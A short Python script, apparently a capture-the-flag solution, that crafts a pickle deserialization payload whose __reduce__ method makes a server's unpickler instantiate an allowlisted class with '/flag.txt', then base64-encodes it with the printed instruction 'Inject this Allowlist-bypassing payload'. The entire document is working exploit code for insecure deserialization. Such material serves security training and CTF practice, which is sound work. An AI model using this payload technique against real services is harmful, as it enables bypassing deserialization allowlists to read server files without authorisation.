import pickle
import base64

# We recreate the class name in our local __main__ scope
# so the serialized data perfectly matches the server's allowlist.
class DiagnosticModule:
    def __reduce__(self):
        # We tell the unpickler to call __main__.DiagnosticModule with our target file.
        # The server will permit this, execute the __init__ function, and read the flag.
        return (self.__class__, ('/flag.txt',))

# Generate the payload using Protocol 4
payload = pickle.dumps(DiagnosticModule(), protocol=4)

# Encode it in Base64 for injection
b64_payload = base64.b64encode(payload).decode()

print("Inject this Allowlist-bypassing payload:")
print(b64_payload)